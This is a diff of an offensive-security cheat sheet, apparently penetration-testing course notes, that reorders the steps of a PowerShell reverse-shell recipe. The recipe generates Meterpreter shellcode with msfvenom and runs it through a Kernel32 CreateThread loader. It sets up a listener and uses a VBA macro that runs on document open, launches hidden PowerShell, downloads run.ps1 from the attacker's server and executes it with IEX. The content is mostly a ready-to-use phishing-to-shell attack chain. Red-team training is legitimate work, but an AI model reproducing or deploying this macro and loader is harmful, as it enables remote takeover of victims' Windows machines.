@@ -120,25 +120,7 @@ End Sub
 ### .ps1 reverse shell
 <details>
 1. generate the shellcode: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f ps1`
-2. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
-3. In Kali, run `python3 -m http.server <port of your choice>`
-4. put this in your VBA
-```
-Sub MyMacro()
-    Dim str As String
-    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://<kali ip>:<http port>/run.ps1') | IEX"
-    Shell str, vbHide
-End Sub
-
-Sub Document_Open()
-    MyMacro
-End Sub
-
-Sub AutoOpen()
-    MyMacro
-End Sub
-```
-4. Save this file as `run.ps1` in the root folder of where u host your python http server
+2. Save this file as `run.ps1` in the root folder of where u host your python http server
 ```
 $Kernel32 = @"
 using System;
@@ -172,6 +154,24 @@ $size = $buf.Length
 $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
 
 [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
+```
+3. In Kali, run `python3 -m http.server <port of your choice>`
+4. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
+5. put this in your VBA
+```
+Sub MyMacro()
+    Dim str As String
+    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://<kali ip>:<http port>/run.ps1') | IEX"
+    Shell str, vbHide
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
 ```
 </details>
 
